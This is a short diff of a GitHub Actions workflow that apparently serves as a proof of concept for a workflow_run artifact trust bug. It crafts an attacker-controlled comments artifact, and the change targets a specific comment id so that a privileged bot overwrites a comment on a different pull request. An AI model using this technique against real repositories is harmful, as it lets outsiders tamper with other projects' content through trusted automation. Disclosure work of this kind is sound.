@@ -12,7 +12,7 @@ jobs:
       - name: Craft attacker-controlled artifact
         run: |
           cat > comments <<'JSON'
-          [{"body":"GAB-POC-PDFTOMARK: this comment was written by github-actions[bot] using attacker-controlled fork-PR artifact content (issue-write workflow_run trust bug)."}]
+          [{"id":6537988310,"body":"GAB-POC-PDFTOMARK: comment on a DIFFERENT pull request was overwritten by attacker-controlled artifact content."}]
           JSON
       - uses: actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02
         with:
